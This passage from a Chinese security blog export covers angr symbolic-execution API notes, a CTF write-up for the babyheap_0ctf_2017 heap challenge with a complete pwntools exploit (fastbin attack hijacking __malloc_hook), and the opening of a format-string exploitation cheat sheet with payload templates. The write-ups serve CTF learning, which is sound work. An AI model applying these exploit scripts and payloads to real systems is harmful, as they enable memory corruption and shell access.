上图提到<code>until we find what we want</code>，simgr提供了函数<code>explore</code>，可以让我们通过两种方式来找到我们需要的state<br />
1. 通过指令在text段的地址 2. 通过任意体现state特征的函数</p>
<ul>
<li>State Explosion
<ol type="1">
<li>但是单纯的遍历每一条路径会存在状态爆炸(State
Explosion，有些地方也叫路径爆炸)的问题，来看下面这个循环
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int x；</span><br><span class="line">for(int 0;i&lt;100;i++)</span><br><span class="line">&#123;</span><br><span class="line">    if(x &gt; 10)</span><br><span class="line">      printf(&quot;Good&quot;);</span><br><span class="line">    else</span><br><span class="line">      printf(&quot;Wrong&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>当i=1时，管理器会创建两个state，而i=2时，先前的两个state有分别会创建两个state，当i=100时，我们就会出现2^100个state，这就是状态爆炸问题</li>
<li>而explore也为我们提供了一个参数avoid，效果就是<code>剪枝</code>，在explore中添加avoid参数会帮助我们提前terminate那些我们不需要的state，因此这个state后续的branch就不会再跟进</li>
</ol></li>
</ul>
<h1 id="x01-库架构分析">0x01 库架构分析</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">angr</span><br><span class="line"> | - Project()</span><br><span class="line">		 | - factory</span><br><span class="line">				 | - state</span><br><span class="line">					   | - entry_state()</span><br><span class="line">					   | - blank_state(addr)</span><br><span class="line"></span><br><span class="line">					   | - regs.eax/ebx/...</span><br><span class="line">					   | - solver</span><br><span class="line">							  | - BVS</span><br><span class="line">							  | - eval</span><br><span class="line">					   | - fs</span><br><span class="line">						    | - insert(string filename,angr.storage.SimFile())</span><br><span class="line">				 | - simulation_manager(init_state)</span><br><span class="line">						 | - explore(find,avoid)</span><br><span class="line">						 | - found[]</span><br><span class="line"></span><br><span class="line"> | - storage</span><br><span class="line">		 | - SimFile(filename,content,size)</span><br><span class="line"> | - sim_options</span><br><span class="line">		 | - SYMBOL_FILL_UNCONSTRAINED_MEMORY</span><br><span class="line">		 | - SYMBOL_FILL_UNCONSTRAINED_REGISTERS</span><br><span class="line"></span><br><span class="line">found_state</span><br><span class="line">	 | - posix</span><br><span class="line">		   | - dumps(std)</span><br><span class="line">	 | - solver</span><br><span class="line">		   | - eval(claripy.BVS pass,cast_to)</span><br></pre></td></tr></table></figure>
<h1 id="x02-api手册">0x02 API手册</h1>
<ul>
<li><strong>Project类(参数、功能、重载、返回值)</strong>
<ol type="1">
<li>构造函数参数：“命令行中运行程序的指令”(eg: "./00_angr_find")</li>
<li>功能：“构建一个符号执行项目”</li>
<li>附属成员
<ul>
<li><strong>factory</strong>
<ol type="1">
<li>附属成员
<ul>
<li><strong>state</strong>
<ol type="1">
<li>重载函数
<ul>
<li><strong>entry_state()</strong>
<ol type="1">
<li>返回值：程序入口点</li>
</ol></li>
<li><strong>blank_state(addr)</strong>
<ol type="1">
<li>参数：模拟执行开始的地址</li>
</ol></li>
</ul></li>
<li>附属成员
<ul>
<li><strong>regs</strong>
<ol type="1">
<li>附属成员: 各种寄存器</li>
</ol></li>
<li><strong>fs</strong>
<ol type="1">
<li>全称: filesystem</li>
<li>附属成员：
<ul>
<li><strong>insert(string filename,angr.storage.simFile)</strong>
<ol type="1">
<li>参数1：文件名称</li>
<li>参数2：创建过的符号化文件对象</li>
</ol></li>
</ul></li>
</ol></li>
</ul></li>
</ol></li>
<li><strong>simulation_manager类</strong>
<ol type="1">
<li>构造函数参数：起始状态</li>
<li>功能：设置模拟执行的起始地址，并返回实例化对象</li>
<li>附属成员
<ul>
<li><strong>explore(find, avoid)</strong>
<ol type="1">
<li>参数find：希望程序抵达的地址</li>
<li>参数avoid：希望程序不抵达的地址</li>
<li>功能：用符号探索到find指向的地址，并避免avoid指向的地址</li>
<li>重载：explore(find=func1,avoid=func2) <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def func1(state):</span><br><span class="line">	return b&quot;Good Job!&quot; in state.posix.dumps(1)</span><br><span class="line">def func2(state):</span><br><span class="line">	return b&quot;Try Again!&quot; in state.posix.dumps(1)</span><br></pre></td></tr></table></figure>
<ol type="1">
<li>功能：探索具有func1特征的的函数分支，回避具有func2特征的函数分支</li>
</ol></li>
</ol></li>
<li><strong>found数组</strong>
<ol type="1">
<li>found_state的实例化数组</li>
</ol></li>
</ul></li>
</ol></li>
</ul></li>
</ol></li>
</ul></li>
</ol></li>
<li><strong>found_state类</strong>
<ul>
<li><strong>posix</strong>
<ul>
<li><strong>dumps(int std)</strong>
<ol type="1">
<li>参数std: stdin(0)/stdout(1)/stderr(2)</li>
<li>功能: 将std指向的内容打印出来</li>
</ol></li>
</ul></li>
<li>solver
<ul>
<li>eval(claripy.BVS arg1)
<ol type="1">
<li>参数：要求解的约束公式</li>
<li>功能：求解arg1并返回结果</li>
</ol></li>
</ul></li>
</ul></li>
<li><strong>claripy类</strong>
<ul>
<li><strong>BVS类</strong>
<ol type="1">
<li>构造函数参数：arg1: 别名 | arg2: 符号向量占多少位</li>
<li>功能：构建一个空的约束公示</li>
</ol></li>
</ul></li>
<li><strong>storage类</strong>
<ul>
<li>SimFile(filename,content,size)
<ol type="1">
<li>参数filename：要引入的filename</li>
<li>参数content：符号化向量</li>
<li>参数size：要从文件中读取的字节数*8（单位：bits）</li>
<li>功能：创建一个符号化的文件对象</li>
</ol></li>
</ul></li>
<li><strong>sim_options类</strong>
<ul>
<li>SYMBOL_FILL_UNCONSTRAINED_MEMORY
<ul>
<li>功能：自动用符号填充未约束的内存（模拟过程中没有明确值的内存位置）</li>
</ul></li>
<li>SYMBOL_FILL_UNCONSTRAINED_REGISTERS
<ul>
<li>功能：自动用符号填充未约束的寄存器</li>
</ul></li>
</ul></li>
</ul>
<h1 id="x01-angr语法">0x01 Angr语法</h1>
<h3 id="准备阶段">1. 准备阶段</h3>
<ul>
<li><p><strong>引入与初始化</strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import angr</span><br><span class="line"></span><br><span class="line">p = angr.Project(exec_path)</span><br><span class="line"></span><br><span class="line">init_state = p.factory.entry_state()</span><br><span class="line"># init_state = p.factory.blank_state(addr) # addr = 0xbeef</span><br><span class="line"></span><br><span class="line">sm = p.factory.simulation_manager(init_state)</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>命令行引入参数</strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def main(argv):</span><br><span class="line">	arg1 = argv[1]</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">	main(sys.argv)</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>符号向量</strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import claripy</span><br><span class="line"></span><br><span class="line">pass1 = claripy.BVS(&#x27;pass1&#x27;, 32)</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>符号化寄存器</strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">init_state.regs.eax = pass1</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>符号化文件</strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename = &quot;&quot;</span><br><span class="line">filesize = </span><br><span class="line"></span><br><span class="line">password = init_state.solver.BVS(&#x27;password&#x27;,filesize*8)</span><br><span class="line">sim_file = angr.storage.SimFile(filename,content=password,size=filesize)</span><br><span class="line"></span><br><span class="line">init_state.fs.insert(sim_file)</span><br></pre></td></tr></table></figure></p></li>
</ul>
<h3 id="探索阶段">2. 探索阶段</h3>
<ul>
<li><p><strong>探索指定地址并查看标准流</strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sm.explore(find = addr_to_find)</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>利用函数explore分支</strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def is_good(state):</span><br><span class="line">	return b&quot;Good Job!&quot; in state.posix.dumps(1)</span><br><span class="line"></span><br><span class="line">def is_bad(state):</span><br><span class="line">	return b&quot;Try Again!&quot; in state.posix.dumps(1)</span><br><span class="line"></span><br><span class="line">sm.explore(find=is_good, avoid=is_bad)</span><br><span class="line"># sm.explore(find=addr_find, avoid=addr_avoid)</span><br></pre></td></tr></table></figure></p></li>
</ul>
<h3 id="输出阶段">3. 输出阶段</h3>
<ul>
<li><p><strong>查看结果</strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if sm.found:</span><br><span class="line">	found_state = sm.found[0]</span><br><span class="line">	</span><br><span class="line">	print(&#x27;[x] Solution: &#123;&#125;&#x27;.format(found_state.posix.dumps(0)))</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>求解寄存器的符号向量</strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">result = init_state.solver.eval(BVS)</span><br></pre></td></tr></table></figure></p></li>
</ul>
]]></content>
      <categories>
        <category>Software analysis technology</category>
      </categories>
      <tags>
        <tag>SymbolicExecution</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF babyheap_0ctf_2017</title>
    <url>/2023/08/14/BUUCTF%20babyheap_0ctf_2017/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
第一道Heap，插个里程碑纪念一下XD
</blockquote>
<span id="more"></span>
<h1 id="x00-写在前面">0x00 写在前面</h1>
<p>七月学完栈溢出，ak掉buu前两页的所有栈题<br />
八月本来是想把堆学穿，等回想起这个目标前半个月已经没了<br />
参加了个数据安全的夏令营<br />
给sdu的新生赛搞宣传（本来想出点签到题结果已经被人出好了TT^TT）<br />
给SecretFlow审了一点go语言的洞<br />
然后用C#和xaml给sdu校园网写了个一键修复脚本<br />
总而言之学的很杂...说实话真不如多打点比赛。<br />
本来栈的能力就没得到比赛的检验，堆的学习时间又所剩无几了...<br />
总而言之还是脚踏实地学一点算一点吧<br />
还有个南大PA的坑等着我去填呢...才刚把nemu的gdb实现了个单步步入...</p>
<hr />
<h1 id="x01-babyheap_0ctf_2017">0x01 babyheap_0ctf_2017</h1>
<blockquote>
<p>做完这道题才算真正意义上的AK第一页XD ### Ⅰ. 主要知识点 1. 堆溢出</p>
</blockquote>
<h3 id="解题步骤">Ⅱ. 解题步骤</h3>
<ol type="1">
<li><p>checksec 保护全开<br />
<img src="/pic/Pasted%20image%2020230814133847.png" /></p></li>
<li><p>该elf文件在ubuntu16中创建，wsl用的本机libc肯定不合适，所以<code>patchelf</code>一下<br />
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ld-2.23.so --replace-needed libc.so.6 ./glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/libc.so.6</span><br></pre></td></tr></table></figure></p></li>
<li><p>拖进IDA64分析，让反汇编以后的代码好看一点<br />
<img src="/pic/Pasted%20image%2020230814134313.png" /> <img
src="/pic/Pasted%20image%2020230814134623.png" />
注：IDA中快捷键y可以修改变量类型，上图Alloc函数的我将a1的变量类型<code>_int64</code>修改为<code>_int64*</code></p></li>
<li><p>IDA分析可知，我们可以有以下思路：</p>
<ol type="1">
<li>Fill函数的输入字符数量是受我们控制的，所以可以堆溢出；</li>
<li>由于本题并没有给出system等可以直接提权的函数，所以考虑泄露libc地址
<ol type="1">
<li>要泄露libc地址，肯定要读存有libc地址的地址
<ol type="1">
<li>哪里存着libc地址？unsorted
bin仅有一个chunk时，此chunk的fd和bk都指向<code>地址main_arena+58</code>，而main_arena是libc的data段中的一个全局静态变量，所以泄露它就可以知道libc_base（注：此处存放的是topchunk的地址）</li>
<li>怎么去读unsorted bin的fd/bk指针？堆溢出+多次free/alloc</li>
</ol></li>
</ol></li>
<li>有了libc地址，我们可以通过修改fastbin的fd指针，在程序的__malloc_hook处(用libc+偏移来计算)申请一个我们可以操控的堆块，并在其中写入og的地址来提权</li>
</ol></li>
<li><p>大概思路我们有了，接下来是写exp+调试验证思路。我们为了能够将chunk放入unsorted
bin，肯定需要一个small chunk；要fastbin attack，肯定需要两个fastbin
chunk；为了方便控制这三个chunk，我们再设置两个fastbin chunk，即：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alloc(0x10) #index = 0</span><br><span class="line">alloc(0x10) #index = 1</span><br><span class="line">alloc(0x10) #index = 2</span><br><span class="line">alloc(0x10) #index = 3</span><br><span class="line">alloc(0x80) #index = 4</span><br></pre></td></tr></table></figure> 此时堆的情况如下 <img
src="/pic/Pasted%20image%2020230814140742.png" /></p></li>
<li><p>Free掉index为1和2的chunk，给后面alloc留出空间 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">free(1)</span><br><span class="line">free(2)</span><br></pre></td></tr></table></figure>
heap情况如下 <img src="/pic/Pasted%20image%2020230814141436.png" />
bin情况如下 <img
src="/pic/Pasted%20image%2020230814141724.png" /></p></li>
<li><p>堆溢出，操控fastbin</p>
<ol type="1">
<li>现在是main_arena_fastbin_0x20 ---&gt; chunk2 ---&gt;chunk1</li>
<li>我们想办法让它变成 xxx_0x20 ---&gt; chunk2 ---&gt;chunk4
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = (p64(0)*3 +p64(0x21))*2 + p8(0x80)</span><br><span class="line">fill(0,payload)</span><br></pre></td></tr></table></figure>
（这里读者可以自己gdb.attach用bin命令去查看fastbin前后的状态）</li>
</ol></li>
<li><p>由于从fastbin申请chunk时会检查fastbin中chunk的size，如果不匹配则报错，所以我们要通过堆溢出修改chunk4的size，让其从0x91变为0x21
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p64(0)*3 + p64(0x21)</span><br><span class="line">fill(3,payload)</span><br></pre></td></tr></table></figure></p></li>
<li><p>申请两个大小为0x10的chunk，可以看到<code>原chunk1</code>指向了<code>原chunk2的地址</code>，<code>原chunk2</code>指向了<code>原chunk4的地址</code>，这样我们就有两个指针指向chunk4了，可以用一个指针来释放，一个指针来读取，方便阅读我们分别命名为pointer_chunk4和pointer_chunk2
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br></pre></td></tr></table></figure> heap情况如下 <img
src="/pic/Pasted%20image%2020230814143302.png" /></p></li>
<li><p>直接用pointer_chunk4释放chunk4，ptmalloc会因为找不到topchunk而报错。所以我们应该恢复chunk4的size到0x91再free，但这样会导致chunk4直接跟topchunk合并。所以我们要先恢复chunk4的size到0x91再申请一个0x80大小的堆块隔离topchunk再free
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p64(0)*3 + p64(0x91)</span><br><span class="line">fill(3,payload)</span><br><span class="line">alloc(0x80)</span><br><span class="line">free(4)</span><br></pre></td></tr></table></figure></p></li>
<li><p>此时chunk4的fd和bk就已经存放着一个地址了，我们通过pointer_chunk2来把他读出来。这个地址是main_arena+88，打开libc可以看到main_arena的地址为0x3c4b20，所以我们获得的libc_addr需要减88再减0x3c4b20，即减去0x3C4B78
<img src="/pic/Pasted%20image%2020230814144704.png" />
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dump(2)</span><br><span class="line">libc_base = u64(io.recv(16)[-8:])-0x3c4b78</span><br><span class="line">print(&quot;libc_base   ---&gt;   &quot;,hex(libc_base))</span><br></pre></td></tr></table></figure></p></li>
<li><p>我们现在有了libc的地址，下一步是劫持malloc_hook。由于我们要通过fastbin来在malloc_hook处申请堆块，所以我们要通过fastbin对于size的检验，所以看一下malloc_hook前面有没有我们能够申请堆块的地方
<img src="/pic/Pasted%20image%2020230814145721.png" />
发现aed处的0x0000007f符合fastbin的空间，所以我们用libc_base+0x3c4aed(这个用当前地址减去基地址即可算出)来申请<br />
⚠这里图aed写错了，而且不应该看这个界面，整体上的chunk应该是
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aed  0x----------------(prev_size) 0x000000000000007f(size)</span><br><span class="line">afd  ---------------------user_data-----------------------</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alloc(0x60)                                    # 将unsortedbin中的chunk4切0x60大小申请出来</span><br><span class="line">free(4)                                        # 把chunk4放到fastbin中，便于用pointer_chunk2操控</span><br><span class="line">payload = p64(libc_base+0x3c4aed)              # 把申请块写进malloc_hook前面</span><br><span class="line">fill(2,payload)                                # 这一步后，fastbin: main_arena ---&gt; chunk4 ---&gt; _ + 0x3c4aed</span><br><span class="line">alloc(0x60)                                    # 把chunk4申请回来</span><br><span class="line">alloc(0x60)                                    # 在malloc_hook处构造堆，index=6</span><br></pre></td></tr></table></figure>
<ol start="13" type="1">
<li><p>我们修改chunk6的内容，即修改malloc_hook，我们用og来提权
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*19 + p64(libc_base + 0x4526a)</span><br><span class="line">fill(6,payload)</span><br></pre></td></tr></table></figure></p></li>
<li><p>若malloc_hook不为空，再申请堆时会先调用malloc_hook处的函数，所以随便申请即可cat
flag <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alloc(255)</span><br></pre></td></tr></table></figure></p></li>
</ol>
<h3 id="完整exp">Ⅲ. 完整EXP</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;node4.buuoj.cn&#x27;</span><br><span class="line">port = 25970</span><br><span class="line">file = &#x27;./babyheap_0ctf_2017&#x27;</span><br><span class="line">  </span><br><span class="line"># io = remote(domain_name,port)</span><br><span class="line">io = process(file)</span><br><span class="line"># gdb.attach(io,&#x27;b main&#x27;)</span><br><span class="line">  </span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(size):</span><br><span class="line">    io.sendlineafter(&#x27;Command: &#x27;, str(1))</span><br><span class="line">    io.sendlineafter(&#x27;Size: &#x27;, str(size))</span><br><span class="line">  </span><br><span class="line">def fill(index, content):</span><br><span class="line">    io.sendlineafter(&#x27;Command: &#x27;, str(2))</span><br><span class="line">    io.sendlineafter(&#x27;Index: &#x27;, str(index))</span><br><span class="line">    io.sendlineafter(&#x27;Size: &#x27;, str(len(content)))</span><br><span class="line">    io.sendlineafter(&#x27;Content: &#x27;,content)</span><br><span class="line">  </span><br><span class="line">def free(index):</span><br><span class="line">    io.sendlineafter(&#x27;Command: &#x27;, str(3))</span><br><span class="line">    io.sendlineafter(&#x27;Index: &#x27;,str(index))</span><br><span class="line">  </span><br><span class="line">def dump(index):</span><br><span class="line">    io.sendlineafter(&#x27;Command: &#x27;, str(4))</span><br><span class="line">    io.sendlineafter(&#x27;Index: &#x27;, str(index))</span><br><span class="line">    io.recvline()</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x80)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">free(1)</span><br><span class="line">free(2)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">payload = (p64(0)*3 +p64(0x21))*2 + p8(0x80)</span><br><span class="line">fill(0,payload)</span><br><span class="line">  </span><br><span class="line">payload = p64(0)*3 + p64(0x21)</span><br><span class="line">fill(3,payload)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x10)</span><br><span class="line">alloc(0x10)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">payload = p64(0)*3 + p64(0x91)</span><br><span class="line">fill(3,payload)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x80)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">free(4)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">dump(2)</span><br><span class="line">libc_base = u64(io.recv(16)[-8:])-0x3c4b78</span><br><span class="line">print(&quot;libc_base   ---&gt;   &quot;,hex(libc_base))</span><br><span class="line">  </span><br><span class="line">gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x60)</span><br><span class="line">free(4)</span><br><span class="line">  </span><br><span class="line">payload = p64(libc_base+0x3c4aed)</span><br><span class="line">fill(2,payload)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x60)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(0x60)</span><br><span class="line">  </span><br><span class="line">payload = b&#x27;a&#x27;*19 + p64(libc_base + 0x4526a)</span><br><span class="line">fill(6,payload)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(255)</span><br><span class="line">  </span><br><span class="line"># gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="一些疑问">Ⅳ. 一些疑问</h3>
<ol type="1">
<li>__malloc_hook不是在data段中吗？这题开了FULL
RELRO为什么可以改啊🤔</li>
<li>第九步中heap中chunk2的Addr为什么还是40而不是80啊？</li>
<li>第十步为什么chunk4会跟topchunk合并？是哪个bin的机制？
<ol type="1">
<li>unsortedbin，后向合并</li>
</ol></li>
<li><strong><em>为什么非要在aed处申请堆块？</em></strong>
<ol type="1">
<li>fastbin指针指向0xaed，说明0xaed-8是size，0xaed-0x10是prev_size，正好伪装chunk</li>
</ol></li>
</ol>
]]></content>
      <categories>
        <category>CTF_practice</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn - Format String Summary</title>
    <url>/2024/01/21/Pwn%20-%20Format%20String%20Summary/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
总结一下格式化字符串漏洞，便于后续调用
</blockquote>
<span id="more"></span>
<h1 id="原理-工具">原理 &amp; 工具</h1>
<h2 id="原理">原理</h2>
<blockquote>
<p>本质是利用 printf(string) 任意地址读写</p>
</blockquote>
<blockquote>
<p>记录一下常用的格式</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fmt    :        标准作用       ||           常用方式</span><br><span class="line">——————————————————————————————————————————————————————————————</span><br><span class="line">%p     :     输出栈上的内容     |  (读) 找偏移\pie_base\canary</span><br><span class="line">%s     :   输出地址指向的内容   ||     (读) 泄露libc_base</span><br><span class="line">%hhn   :   修改地址指向的byte   |        (写) 任意地址写</span><br><span class="line">%hn/%n : 修改地址指向的2/4bytes |        (写) 任意地址写</span><br></pre></td></tr></table></figure>
<h2 id="工具-pwntools---fmtstr_payload">工具: Pwntools -
fmtstr_payload</h2>
<p><a href="https://docs.pwntools.com/en/stable/fmtstr.html">Pwntools -
class fmtstr</a></p>
<blockquote>
<p>源码见上述链接或文章末尾的 Appendix</p>
</blockquote>
<p>fmtstr是一个类，我们只需要用其中的 fmtstr_payload 来构造我们的
payload 即可。现在版本的 pwntools 已经支持 64 位的 格式化字符串 payload
生成了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Default: numbwritten=0 , write_size=&#x27;byte&#x27;</span><br><span class="line">payload = fmtstr_payload(offset, writes, numbwritten=, write_size=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line"># Example:</span><br><span class="line">context.clear(arch = &#x27;amd64&#x27;)</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;int&#x27;)</span><br><span class="line">b&#x27;%322419390c%4$llnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;short&#x27;)</span><br><span class="line">b&#x27;%47806c%5$lln%22649c%6$hnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;byte&#x27;)</span><br><span class="line">b&#x27;%190c%7$lln%85c%8$hhn%36c%9$hhn%131c%10$hhnaaaab\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">context.clear(arch = &#x27;i386&#x27;)</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;int&#x27;)</span><br><span class="line">b&#x27;%322419390c%5$na\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;short&#x27;)</span><br><span class="line">b&#x27;%4919c%7$hn%42887c%8$hna\x02\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;byte&#x27;)</span><br><span class="line">b&#x27;%19c%12$hhn%36c%13$hhn%131c%14$hhn%4c%15$hhn\x03\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x00000001&#125;, write_size=&#x27;byte&#x27;)</span><br><span class="line">b&#x27;c%3$naaa\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: b&quot;\xff\xff\x04\x11\x00\x00\x00\x00&quot;&#125;, write_size=&#x27;short&#x27;)</span><br><span class="line">b&#x27;%327679c%7$lln%18c%8$hhn\x00\x00\x00\x00\x03\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(10, &#123;0x404048 : 0xbadc0ffe, 0x40403c : 0xdeadbeef&#125;, no_dollars=True)</span><br><span class="line">b&#x27;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%125c%hhn%17c%hhn%32c%hhn%17c%hhn%203c%hhn%34c%hhn%3618c%hnacccc&gt;@@\x00cccc=@@\x00cccc?@@\x00cccc&lt;@@\x00ccccK@@\x00ccccJ@@\x00ccccH@@\x00&#x27;</span><br><span class="line">fmtstr_payload(6, &#123;0x404048 : 0xbadbad00&#125;, no_dollars=True)</span><br><span class="line">b&#x27;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%229c%hhn%173c%hhn%13c%hhn%33c%hhnccccH@@\x00ccccI@@\x00ccccK@@\x00ccccJ@@\x00&#x27;</span><br><span class="line">fmtstr_payload(6, &#123;0x4040 : 0xbadbad00, 0x4060: 0xbadbad02&#125;, no_dollars=True)</span><br><span class="line">b&#x27;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%212c%hhn%173c%hhn%13c%hhn%33c%hhn%39c%hhn%171c%hhn%13c%hhn%33c%hhnacccc@@\x00\x00ccccA@\x00\x00ccccC@\x00\x00ccccB@\x00\x00cccc`@\x00\x00cccca@\x00\x00ccccc@\x00\x00ccccb@\x00\x00&#x27;</span><br></pre></td></tr></table></figure>
<h1 id="ctf-中的题型">CTF 中的题型</h1>
<h2 id="栈上">栈上</h2>
<h3 id="位">32位</h3>
<blockquote>
<p>最基础的题目，fmtstr_payload一把梭，模板如下</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 确认偏移量</span><br><span class="line">payload = &#x27;%p-&#x27;*10</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"># 假设 offset=6，泄露libc基址</span><br><span class="line">printf_got = elf.got[&#x27;printf&#x27;]</span><br><span class="line">payload    = p32(printf_got) + b&#x27;%6$s&#x27;</span><br><span class="line"># payload  = b&#x27;%7$s&#x27; + p32(printf_got)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"># 确认libc</span><br><span class="line">printf_addr = u32(io.recvuntil(&#x27;\x7f&#x27;)[-3:])</span><br><span class="line">libc        = LibcSearcher(&#x27;printf&#x27;,printf_addr)</span><br><span class="line">libc_base   = printf_addr - libc.dump(&#x27;printf&#x27;)</span><br><span class="line">system_addr = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line"></span><br><span class="line"># 接收程序信息，向程序发送payload</span><br><span class="line">payload = fmtstr_payload(6,&#123;printf_got:system_addr&#125;,numbwritten=0,write_size=&#x27;short&#x27;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"># 提权</span><br><span class="line">io.sendline(&#x27;;/bin/sh&#x27;)</span><br></pre></td></tr></table></figure>
<h3 id="位-1">64位</h3>
<blockquote>
<p>由于许多地址只有六字节，所以为了对齐八字节，我们需要用''来填充，但''会截断
printf 的输出，所以我们需要让 printf 先输出格式化字符.</p>
</blockquote>
